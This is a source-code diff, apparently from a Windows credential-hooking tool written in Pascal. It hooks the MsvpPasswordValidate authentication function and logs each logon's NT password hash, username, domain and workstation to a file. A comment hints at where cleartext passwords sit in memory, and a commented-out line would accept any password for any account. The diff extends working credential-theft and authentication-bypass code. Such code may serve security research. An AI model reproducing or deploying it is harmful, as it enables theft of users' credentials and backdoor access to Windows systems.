@@ -12,6 +12,30 @@ type _NETLOGON_LOGON_INFO_CLASS =(
 
 type tbyte16=array[0..15] of byte;
 
+ type
+UNICODE_STRING = record
+  Length: USHORT;
+  MaximumLength: USHORT;
+  {$ifdef CPU64}dummy:dword;{$endif cpu64}
+  Buffer: PWIDECHAR;
+end;
+
+type _OLD_LARGE_INTEGER =record
+    LowPart:ulong;
+    HighPart:long;
+   end;
+ OLD_LARGE_INTEGER=_OLD_LARGE_INTEGER;
+
+ //https://docs.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-netlogon_logon_identity_info
+   type _NETLOGON_LOGON_IDENTITY_INFO =record
+         LogonDomainName:UNICODE_STRING;
+         ParameterControl:ULONG;
+         LogonId:OLD_LARGE_INTEGER;
+         UserName:UNICODE_STRING;
+         Workstation:UNICODE_STRING;
+   end;
+   PNETLOGON_LOGON_IDENTITY_INFO=^_NETLOGON_LOGON_IDENTITY_INFO;
+
 type _SAMPR_USER_INTERNAL1_INFORMATION =record
    EncryptedNtOwfPassword:tbyte16;
    EncryptedLmOwfPassword:tbyte16;
@@ -22,13 +46,13 @@ type _SAMPR_USER_INTERNAL1_INFORMATION =record
  SAMPR_USER_INTERNAL1_INFORMATION=_SAMPR_USER_INTERNAL1_INFORMATION;
  PSAMPR_USER_INTERNAL1_INFORMATION=^SAMPR_USER_INTERNAL1_INFORMATION;
 
-type TMsvpPasswordValidate=function(a:pointer;
+type TMsvpPasswordValidate=function(UasCompatibilityRequired:pointer;
      logontype:word;
-     b:pointer;
-     c:pointer;
-     d:pointer;
-     e:pointer;
-     f:pointer): dword;stdcall;
+     LogonInformation:pointer;
+     Passwords:pointer;
+     UserFlags:pointer;
+     UserSessionKey:pointer;
+     LmSessionKey:pointer): dword;stdcall;
 
   var
   Trampoline: TMsvpPasswordValidate = nil;
@@ -48,7 +72,7 @@ Therefore, do not pass a handle returned by GetModuleHandle to the FreeLibrary f
 Doing so can cause a DLL module to be unmapped prematurely.
 }
 
-procedure log(s:string;l:ushort=0);
+procedure log(s:ansistring;l:ushort=0);
 var
    	 hFile:HANDLE;
 	 dwWritten:DWORD;
@@ -87,6 +111,8 @@ on e:exception do log('ByteToHexaString:'+e.Message );
 end;
 end;
 
+//LogonInformation
+//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d0128545-f74b-4d89-afd9-42621dff24c4
 {
 BOOLEAN
 MsvpPasswordValidate (
@@ -100,25 +126,29 @@ MsvpPasswordValidate (
 )
 }
 
-function myMsvpPasswordValidate(a:pointer;
+function myMsvpPasswordValidate(UasCompatibilityRequired:pointer;
      logontype:word;
-     b:pointer;
-     c:pointer;
-     d:pointer;
-     e:pointer;
-     f:pointer): dword;stdcall;
-var
-a_,b_:array[0..15] of byte;
-i:byte;
-s:string;
-match:boolean=false;
+     LogonInformation:pointer;
+     Passwords:pointer;
+     UserFlags:pointer;
+     UserSessionKey:pointer;
+     LmSessionKey:pointer): dword;stdcall;
 begin
-s:='';
 OutputDebugString('MsvpPasswordValidate');
 log('****************'+#13#10);
 log('LogonLevel:'+inttostr(logontype)+#13#10);
-log('EncryptedNtOwfPassword:'+ByteToHexaString(PSAMPR_USER_INTERNAL1_INFORMATION(c)^.EncryptedNtOwfPassword)+#13#10) ;
-Result := Trampoline(a,logontype,b,c,d,e,f );
+log('EncryptedNtOwfPassword:'+ByteToHexaString(PSAMPR_USER_INTERNAL1_INFORMATION(passwords)^.EncryptedNtOwfPassword)+#13#10) ;
+log('LogonDomainName:');
+log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.LogonDomainName.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.LogonDomainName.Length  div 2) ;
+log(#13#10);
+//seems provided clear text password is right after the pointer for username...
+log('UserName:');
+log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.UserName.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.UserName.Length  div 2 ) ;
+log(#13#10);
+log('Workstation:');
+log(ansistring(strpas(PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.Workstation.Buffer)),PNETLOGON_LOGON_IDENTITY_INFO(LogonInformation)^.Workstation.Length div 2) ;
+log(#13#10);
+Result := Trampoline(UasCompatibilityRequired,logontype,LogonInformation,Passwords,UserFlags,UserSessionKey,LmSessionKey );
 //result:=1; //this will validate any password and any account (local & remote)
 end;
 
